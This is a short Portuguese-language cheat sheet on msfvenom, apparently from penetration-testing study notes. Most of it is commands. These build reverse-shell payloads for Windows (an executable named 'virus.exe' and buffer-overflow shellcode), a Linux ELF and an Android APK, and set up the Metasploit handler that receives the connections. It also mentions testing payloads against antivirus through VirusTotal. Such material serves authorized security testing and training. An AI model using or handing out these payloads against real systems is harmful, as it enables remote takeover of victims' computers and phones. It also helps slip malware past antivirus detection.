# MSFVENOM

O **msfvenom** é utilizado para criação de exploit.  
Teste os seus payloads através do site <https://www.virustotal.com>.  
*Cuidado pois ao enviar para o vírus total, a heurística pode ser atualizada nos antivírus.*

Verificar todos os payloads:

```bash
msfvenom --list payloads
```

Gerando payload para Windows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=443 -f exe > virus.exe
```

Para receber a conexão do alvo será necessário que o msf esteja em execução:

```bash
msfconsole
```

```msf
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 443
msf exploit(handler) > set LHOST 192.168.0.100
msf exploit(handler) > exploit*
```

Criando um exploit para Windows para BoF:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.100 LPORT=443 -b "\x00\x0a\x0d\x20" EXITFUNC=thread -f python
```

**-p windows/shell_reverser_tcp** ==> Tipo do exploit.  
**LHOST** ==> IP de conexão reversa.  
**LPORT** ==> Porta de conexão reversa.  
**-b "\x00\x0a\x0d\x20"** ==> Bad caracteres ou caracteres inválidos.  
**-f python** ==> Linguagem que vai ser gerado o exploit.  
**EXITFUNC=thread** ==> Evita que a aplicação morra depois do exploit ser fechado.

Gerando payload binário para sistema Linux:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lport=433 lhost=192.168.0.111 -f elf > malicioso
```

*Utilizado quando você já tem uma shell no device e necessita usar o meterpreter para auxiliar na pós exploração.*

Gerando payload APK para Android:

```bash
msfvenom -p android/meterpreter/reverse_tcp lport=433 lhost=192.168.0.111 R > malicioso.apk
```

**R** ==> Salva em modo RAW.

*Utilizado quando você já tem uma shell no device e necessita usar o meterpreter para auxiliar na pós exploração.*
